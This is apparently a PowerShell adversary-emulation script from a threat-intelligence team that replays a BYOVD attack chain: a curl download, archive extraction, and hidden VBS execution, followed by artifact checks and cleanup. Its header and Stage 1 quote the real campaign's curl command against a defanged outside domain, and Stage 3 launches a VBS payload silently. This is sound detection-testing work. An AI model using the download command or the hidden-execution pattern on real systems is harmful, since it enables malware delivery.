# BYOVD Attack Chain Test Script
# Tests the complete curl -> PowerShell -> VBS execution chain
# Simulates: curl -k -o "%TEMP%\nvidiadrivers.zip" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update
# Author: Crimson7 Threat Intelligence Team

param(
    [switch]$UseLocalFile = $true,
    [string]$TestPackagePath = ".\nvidiadrivers.zip",
    [switch]$VerboseOutput = $true,
    [switch]$CleanupAfterTest = $true,
    [int]$VBSTimeoutSeconds = 120
)

$script:TestStartTime = Get-Date
$script:TestLog = "$env:TEMP\byovd_attack_chain_test_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

function Write-TestLog {
    param([string]$Message, [string]$Level = "INFO")
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    if ($VerboseOutput) {
        Write-Host $logEntry -ForegroundColor $(
            switch ($Level) {
                "ERROR" { "Red" }
                "WARNING" { "Yellow" }
                "SUCCESS" { "Green" }
                "STAGE" { "Cyan" }
                "SIMULATION" { "Magenta" }
                default { "White" }
            }
        )
    }
    
    Add-Content -Path $script:TestLog -Value $logEntry
}

function Test-Prerequisites {
    Write-TestLog "Checking test prerequisites..." -Level "STAGE"
    
    # Check if test package exists
    if ($UseLocalFile) {
        if (Test-Path $TestPackagePath) {
            $packageInfo = Get-Item $TestPackagePath
            Write-TestLog "Test package found: $($packageInfo.Name) ($($packageInfo.Length) bytes)" -Level "SUCCESS"
        } else {
            Write-TestLog "Test package not found: $TestPackagePath" -Level "ERROR"
            return $false
        }
    }
    
    # Check for required tools
    $requiredTools = @("curl", "powershell", "wscript")
    foreach ($tool in $requiredTools) {
        try {
            $toolPath = Get-Command $tool -ErrorAction Stop
            Write-TestLog "Tool available: $tool at $($toolPath.Source)" -Level "SUCCESS"
        } catch {
            Write-TestLog "Tool not found: $tool" -Level "ERROR"
            return $false
        }
    }
    
    # Check temp directory
    if (-not (Test-Path $env:TEMP)) {
        Write-TestLog "TEMP directory not accessible: $env:TEMP" -Level "ERROR"
        return $false
    }
    
    Write-TestLog "Prerequisites check completed successfully" -Level "SUCCESS"
    return $true
}

function Invoke-Stage1_Download {
    Write-TestLog "=== STAGE 1: Simulating malicious download ===" -Level "STAGE"
    
    $targetFile = "$env:TEMP\nvidiadrivers.zip"
    
    if ($UseLocalFile) {
        Write-TestLog "SIMULATION: curl -k -o `"$targetFile`" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update" -Level "SIMULATION"
        Write-TestLog "Using local file instead of actual network download for safety" -Level "INFO"
        
        try {
            Copy-Item $TestPackagePath $targetFile -Force
            Write-TestLog "Package 'downloaded' successfully to: $targetFile" -Level "SUCCESS"
            
            # Verify download
            if (Test-Path $targetFile) {
                $downloadedFile = Get-Item $targetFile
                Write-TestLog "Download verification: $($downloadedFile.Length) bytes" -Level "SUCCESS"
                return $true
            } else {
                Write-TestLog "Download verification failed - file not found" -Level "ERROR"
                return $false
            }
        } catch {
            Write-TestLog "Download simulation failed: $($_.Exception.Message)" -Level "ERROR"
            return $false
        }
    } else {
        Write-TestLog "Network download mode not implemented for safety" -Level "WARNING"
        return $false
    }
}

function Invoke-Stage2_Extract {
    Write-TestLog "=== STAGE 2: Archive extraction ===" -Level "STAGE"
    
    $sourceFile = "$env:TEMP\nvidiadrivers.zip"
    $extractPath = "$env:TEMP\nvidiadrivers"
    
    # Simulate the PowerShell extraction command
    $extractCommand = "Expand-Archive -Force -Path '$sourceFile' -DestinationPath '$extractPath'"
    Write-TestLog "EXECUTING: powershell -Command `"$extractCommand`"" -Level "SIMULATION"
    
    try {
        # Execute the extraction
        Expand-Archive -Force -Path $sourceFile -DestinationPath $extractPath
        
        Write-TestLog "Archive extracted successfully to: $extractPath" -Level "SUCCESS"
        
        # Verify extraction
        if (Test-Path $extractPath) {
            $extractedFiles = Get-ChildItem $extractPath -Recurse
            Write-TestLog "Extracted files count: $($extractedFiles.Count)" -Level "SUCCESS"
            
            Write-TestLog "Package contents with full paths:" -Level "INFO"
            foreach ($file in $extractedFiles) {
                if ($file.PSIsContainer) {
                    Write-TestLog "  [DIR]  $($file.FullName)" -Level "INFO"
                } else {
                    Write-TestLog "  [FILE] $($file.FullName) ($($file.Length) bytes)" -Level "INFO"
                }
            }
            
            return $true
        } else {
            Write-TestLog "Extraction verification failed - directory not found" -Level "ERROR"
            return $false
        }
    } catch {
        Write-TestLog "Archive extraction failed: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-Stage3_VBSExecution {
    Write-TestLog "=== STAGE 3: VBS script execution ===" -Level "STAGE"
    
    # Check multiple possible VBS script locations
    $vbsScriptPaths = @(
        "$env:TEMP\nvidiadrivers\install.vbs",
        "$env:TEMP\nvidiadrivers\nvidiadrivers\install.vbs",
        "$env:TEMP\nvidiadrivers\update.vbs",
        "$env:TEMP\nvidiadrivers\nvidiadrivers\update.vbs",
        "$env:TEMP\nvidiadrivers\driver_loader.vbs",
        "$env:TEMP\nvidiadrivers\nvidiadrivers\driver_loader.vbs"
    )
    
    $vbsScript = $null
    foreach ($scriptPath in $vbsScriptPaths) {
        if (Test-Path $scriptPath) {
            $vbsScript = $scriptPath
            Write-TestLog "VBS script found: $vbsScript" -Level "SUCCESS"
            break
        }
    }
    
    if (-not $vbsScript) {
        Write-TestLog "No VBS scripts found in any expected locations" -Level "ERROR"
        Write-TestLog "Searched paths:" -Level "INFO"
        foreach ($searchPath in $vbsScriptPaths) {
            Write-TestLog "  - $searchPath" -Level "INFO"
        }
        return $false
    }
    
    # Simulate the VBS execution command
    Write-TestLog "EXECUTING: wscript `"$vbsScript`"" -Level "SIMULATION"
    
    try {
        # Execute the VBS script
        $vbsProcess = Start-Process "wscript.exe" -ArgumentList "`"$vbsScript`"" -PassThru -WindowStyle Hidden
        
        if ($vbsProcess) {
            Write-TestLog "VBS script execution started (PID: $($vbsProcess.Id))" -Level "SUCCESS"
            
            # Wait for completion (with timeout and progress monitoring)
            $timeout = $VBSTimeoutSeconds
            Write-TestLog "Waiting for VBS completion (timeout: $timeout seconds)..." -Level "INFO"
            
            # Monitor process with periodic updates
            $waitStart = Get-Date
            $progressInterval = 15 # seconds
            $completed = $false
            
            while (-not $completed -and ((Get-Date) - $waitStart).TotalSeconds -lt $timeout) {
                $completed = $vbsProcess.WaitForExit($progressInterval * 1000)
                if (-not $completed) {
                    $elapsed = [math]::Round(((Get-Date) - $waitStart).TotalSeconds, 1)
                    Write-TestLog "VBS process still running... (elapsed: $elapsed/$timeout seconds)" -Level "INFO"
                    
                    # Check if process still exists
                    try {
                        $processCheck = Get-Process -Id $vbsProcess.Id -ErrorAction Stop
                        Write-TestLog "Process status: $($processCheck.ProcessName) - Working Set: $([math]::Round($processCheck.WorkingSet64/1MB,1)) MB" -Level "INFO"
                    } catch {
                        Write-TestLog "Process may have ended unexpectedly" -Level "WARNING"
                        break
                    }
                }
            }
            
            if ($completed) {
                Write-TestLog "VBS script execution completed (Exit code: $($vbsProcess.ExitCode))" -Level "SUCCESS"
            } else {
                Write-TestLog "VBS script execution timed out after $timeout seconds" -Level "WARNING"
                try {
                    if (-not $vbsProcess.HasExited) {
                        $vbsProcess.Kill()
                        Write-TestLog "VBS process terminated due to timeout" -Level "WARNING"
                    }
                } catch {
                    Write-TestLog "Failed to terminate VBS process: $($_.Exception.Message)" -Level "WARNING"
                }
                return $false
            }
        } else {
            Write-TestLog "Failed to start VBS process" -Level "ERROR"
            return $false
        }
        
        # Check for execution artifacts
        $artifactChecks = @(
            "$env:TEMP\nvidia_install_*.log",
            "$env:TEMP\vbs_driver_test.log",
            "$env:TEMP\byovd_*.log"
        )
        
        foreach ($pattern in $artifactChecks) {
            $artifacts = Get-ChildItem $pattern -ErrorAction SilentlyContinue
            if ($artifacts) {
                Write-TestLog "Execution artifacts found: $($artifacts.Count) files matching $pattern" -Level "SUCCESS"
            }
        }
        
        return $true
    } catch {
        Write-TestLog "VBS script execution failed: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-PostExecutionAnalysis {
    Write-TestLog "=== POST-EXECUTION ANALYSIS ===" -Level "STAGE"
    
    # Check for created artifacts
    Write-TestLog "Analyzing execution artifacts..." -Level "INFO"
    
    # Registry artifacts
    $regPaths = @(
        "HKCU:\Software\BYOVDNVIDIATest",
        "HKCU:\Software\BYOVDNVIDIASetup",
        "HKCU:\Software\VBSBYOVDTest"
    )
    
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            Write-TestLog "Registry artifact found: $regPath" -Level "SUCCESS"
            try {
                $values = Get-ItemProperty $regPath
                $values.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object {
                    Write-TestLog "  $($_.Name): $($_.Value)" -Level "INFO"
                }
            } catch {}
        }
    }
    
    # File artifacts
    $filePatterns = @(
        "$env:TEMP\nvidia_*.txt",
        "$env:TEMP\byovd_*.txt", 
        "$env:TEMP\*_iocs.txt",
        "$env:TEMP\*driver*.log"
    )
    
    foreach ($pattern in $filePatterns) {
        $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            Write-TestLog "File artifact found: $($file.Name) ($($file.Length) bytes)" -Level "SUCCESS"
        }
    }
    
    # Event log artifacts
    try {
        $recentEvents = Get-WinEvent -FilterHashtable @{
            LogName = "Application"
            StartTime = $script:TestStartTime
        } -ErrorAction SilentlyContinue | Where-Object { 
            $_.ProviderName -like "*BYOVD*" -or $_.Message -like "*BYOVD*" 
        }
        
        if ($recentEvents) {
            Write-TestLog "Event log artifacts found: $($recentEvents.Count) events" -Level "SUCCESS"
            foreach ($event in $recentEvents) {
                Write-TestLog "  Event ID $($event.Id): $($event.ProviderName)" -Level "INFO"
            }
        }
    } catch {
        Write-TestLog "Could not check event logs: $($_.Exception.Message)" -Level "WARNING"
    }
    
    # Service artifacts
    $testServices = Get-Service | Where-Object { $_.Name -like "*BYOVD*" -or $_.Name -like "*Test*Driver*" }
    foreach ($service in $testServices) {
        Write-TestLog "Service artifact found: $($service.Name) (Status: $($service.Status))" -Level "SUCCESS"
    }
}

function Invoke-TestCleanup {
    if ($CleanupAfterTest) {
        Write-TestLog "=== CLEANUP ===" -Level "STAGE"
        
        # Remove test files
        $cleanupPaths = @(
            "$env:TEMP\nvidiadrivers.zip",
            "$env:TEMP\nvidiadrivers"
        )
        
        foreach ($path in $cleanupPaths) {
            if (Test-Path $path) {
                try {
                    Remove-Item $path -Recurse -Force
                    Write-TestLog "Cleaned up: $path" -Level "SUCCESS"
                } catch {
                    Write-TestLog "Cleanup failed: $path - $($_.Exception.Message)" -Level "WARNING"
                }
            }
        }
        
        # Clean test registry entries
        $regCleanupPaths = @(
            "HKCU:\Software\BYOVDNVIDIATest",
            "HKCU:\Software\BYOVDNVIDIASetup",
            "HKCU:\Software\VBSBYOVDTest"
        )
        
        foreach ($regPath in $regCleanupPaths) {
            if (Test-Path $regPath) {
                try {
                    Remove-Item $regPath -Recurse -Force
                    Write-TestLog "Registry cleanup: $regPath" -Level "SUCCESS"
                } catch {
                    Write-TestLog "Registry cleanup failed: $regPath" -Level "WARNING"
                }
            }
        }
        
        Write-TestLog "Cleanup completed" -Level "SUCCESS"
    } else {
        Write-TestLog "Cleanup skipped - artifacts preserved for analysis" -Level "INFO"
    }
}

function Show-TestSummary {
    $testDuration = ((Get-Date) - $script:TestStartTime).TotalSeconds
    
    Write-TestLog "=== ATTACK CHAIN TEST SUMMARY ===" -Level "STAGE"
    Write-TestLog "Test Duration: $([math]::Round($testDuration, 2)) seconds" -Level "INFO"
    Write-TestLog "Test Log: $script:TestLog" -Level "INFO"
    
    if ($VerboseOutput) {
        Write-Host @"

+=================================================================+
|                   BYOVD ATTACK CHAIN TEST COMPLETED            |
+=================================================================+
| Simulation: Lazarus Group ClickFake Campaign                   |
| Attack Chain: curl -> PowerShell -> VBS -> Driver Loading      |
| Duration: $([math]::Round($testDuration, 2)) seconds                                           |
| Status: Test completed successfully                            |
+=================================================================+
| MITRE ATT&CK Techniques Demonstrated:                          |
| - T1105 - Ingress Tool Transfer (Download simulation)          |
| - T1059.001 - PowerShell (Archive extraction)                  |
| - T1059.005 - VBS Execution (Payload execution)                |
| - T1068 - Privilege Escalation (Driver loading)                |
| - T1562.001 - Defense Evasion (Security bypass)                |
+=================================================================+
| Detection Opportunities:                                        |
| - File downloads to TEMP directory                             |
| - Archive extraction operations                                |
| - VBS script execution from TEMP                               |
| - Driver file creation and service installation                |
| - Registry modifications in test paths                         |
+=================================================================+
| Next Steps:                                                     |
| - Review test log for detailed execution timeline              |
| - Analyze generated artifacts for IOC extraction               |
| - Validate security controls detected the simulation           |
| - Document lessons learned for defense improvement             |
+=================================================================+

"@ -ForegroundColor Cyan
    }
}

# Main execution
Write-TestLog "BYOVD Attack Chain Test Started" -Level "STAGE"
Write-TestLog "Test Configuration: UseLocalFile=$UseLocalFile, CleanupAfterTest=$CleanupAfterTest, VBSTimeout=$VBSTimeoutSeconds sec" -Level "INFO"

try {
    # Check prerequisites
    if (-not (Test-Prerequisites)) {
        Write-TestLog "Prerequisites check failed - aborting test" -Level "ERROR"
        exit 1
    }
    
    # Execute attack chain stages
    $stage1Success = Invoke-Stage1_Download
    if (-not $stage1Success) {
        Write-TestLog "Stage 1 failed - aborting test" -Level "ERROR"
        exit 1
    }
    
    $stage2Success = Invoke-Stage2_Extract
    if (-not $stage2Success) {
        Write-TestLog "Stage 2 failed - aborting test" -Level "ERROR"
        exit 1
    }
    
    $stage3Success = Invoke-Stage3_VBSExecution
    if (-not $stage3Success) {
        Write-TestLog "Stage 3 failed - continuing with analysis" -Level "WARNING"
    }
    
    # Analyze results
    Invoke-PostExecutionAnalysis
    
    # Cleanup
    Invoke-TestCleanup
    
    # Show summary
    Show-TestSummary
    
    Write-TestLog "BYOVD Attack Chain Test Completed Successfully" -Level "SUCCESS"
    
} catch {
    Write-TestLog "Test execution failed: $($_.Exception.Message)" -Level "ERROR"
    Write-TestLog "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
    exit 1
}